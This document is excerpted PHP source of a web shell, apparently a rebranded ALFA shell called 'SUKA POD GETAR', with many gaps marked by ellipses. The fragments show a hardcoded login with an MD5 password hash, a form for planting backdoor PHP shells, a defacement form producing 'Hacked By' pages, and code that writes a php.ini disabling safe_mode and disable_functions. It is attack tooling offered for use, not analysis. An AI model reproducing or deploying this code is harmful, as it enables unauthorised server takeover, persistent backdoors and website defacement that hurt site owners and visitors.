...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '831167d1d11e16b877055beb00ffec4b',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_CODE_NAME__", "SUKA POD GETAR");
...
<title>~ SUKA POD GETAR Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="SUKA POD GETAR 2012" draggable="false" src="https://j.top4top.io/p_3187lxkpt0.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ SUKA POD GETAR Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ SUKA POD GETAR Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="SUKA POD GETAR 2012" draggable="false" src="https://j.top4top.io/p_3187lxkpt0.png" /></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('SUKA POD GETAR is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>SUKA POD GETAR Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By SUKA POD GETAR (SUKA POD GETAR)</font><br>
...
<textarea name=index rows='19' cols='103'><title>Hacked By SUKA POD GETAR</title><b>Hacked By SUKA POD GETAR</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By SUKA POD GETAR</title><b>Hacked By SUKA POD GETAR</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By SUKA POD GETAR(SUKA POD GETAR)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="SUKA POD GETAR 2012" />
<br>
